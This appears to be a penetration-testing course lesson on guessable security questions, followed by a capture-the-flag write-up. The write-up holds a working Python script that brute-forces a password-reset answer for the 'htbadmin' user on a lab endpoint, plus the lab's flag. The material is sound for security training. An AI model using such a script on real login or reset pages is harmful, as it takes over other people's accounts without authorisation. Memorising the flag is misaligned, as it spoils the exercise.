# Guessable Answers

Often web applications authenticate users who lost their password by requesting that they answer one or multiple questions. Those questions, usually presented to the user during the registration phase, are mostly hardcoded and cannot be chosen by them. They are, therefore, quite generic.

Assuming we had found such functionality on a target website, we should try abusing it to bypass authentication. In these cases, the problem, or rather the weak point, is not the function per se but the predictability of questions and the users or employees themselves. It is common to find questions like the below.

* "`What is your mother's maiden name?`"
* "`What city were you born in?`"

The first one could be found using `OSINT`, while the answer to the second one could be identified again using `OSINT` or via a brute-force attack. Admittedly, answering both questions could be performed without knowing much about the target user.

![](https://academy.hackthebox.com/storage/modules/80/10-registration\_question.png)

We discourage the use of security answers because even when an application allows users to choose their questions, answers could still be predictable due to users’ negligence. To raise the security level, a web application should keep repeating the first question until the user answers correctly. This way, an attacker who is not lucky enough to know the first answer or come across a question that can be easily brute-forced on the first shot cannot try the second one. When we find a web application that keeps rotating questions, we should collect them to identify the easiest to brute force and then mount the attack.

Scraping a website could be quite complicated because some web applications scramble form data or use JavaScript to populate forms. Some others keep all question details stored on the server-side. Therefore, we should build a brute force script utilizing a helper, like when there is an Anti-CSRF token present. We prepared a basic web page that rotates questions and a Python template that you can use to experiment with this attack. You can download the PHP file [here](https://academy.hackthebox.com/storage/modules/80/scripts/predictable\_questions\_php.txt) and Python code [here](https://academy.hackthebox.com/storage/modules/80/scripts/predictable\_questions\_py.txt). Take the time to understand how the web application functions fully. We suggest trying manually and then writing your own script. Use someone else’s script only as a last resort.

**Questions**

Reset the htbadmin user's password by guessing one of the questions. What is the flag?

* Notice that the application changes the question every time we fail to provide the correct answer. Amongst the questions, “What is your favorite color?” seems to be the easiest one to brute force. Hence, this will be the targeted question.
* Modify the above provided script to best fit the target: `URL, question`
* Create the passwords list

```bash
#https://github.com/imsky/wordlists/blob/master/adjectives/colors.txt
vim color.txt
```

Brute forcing script

```python
#script to brute force reset password htbadmin
import sys
import requests
import os.path

# target url, change as needed
url = "http://94.237.63.83:38572/forgot.php"

# fake headers to present ourself as Chromium browser, change if needed
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

# string expected if the answer is wrong
invalid = "Sorry, wrong answer"

# question to bruteforce
question = 'What is your favourite color?'

# wordlist is expected as one word per line, function kept to let you to parse different wordlist format keeping the code clean
def unpack(fline):
    answer = fline

    return answer

# do the web request, change data as needed
def do_req(url, answer, headers):
    # closely inspect POST data sent using any intercepting proxy to create a valid data
    data = {"question": question, "userid": "htbadmin", "answer": answer, "submit": "answer"}
    res = requests.post(url, headers=headers, data=data)

    return res.text

# pretending we just know the message received when the answer is wrong, we flip the check
def check(haystack, needle):
    # if our invalid string is found in response body return False
    if needle in haystack:
        return False
    else:
        return True

def main():
    # check if wordlist has been given and exists
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    # open the file
    with open(fname) as fh:
        for fline in fh:
            # skip line if starts with a comment
            if fline.startswith("#"):
                continue
            # extract userid and password from wordlist, removing trailing newline
            answer = unpack(fline.rstrip())

            # do HTTP request
            print("[-] Checking word {}".format(answer))
            res = do_req(url, answer, headers)

            # check if response text matches our content
            #print(res)
            if (check(res, invalid)):
                print("[+] Valid answer found: {}".format(answer))
                sys.exit()

if __name__ == "__main__":
    main()

#usage
#python3 brute-force.py color.txt
#HTB{gu3ss4bl3_4n5w3r5_4r3_gu3ss4bl3}
```
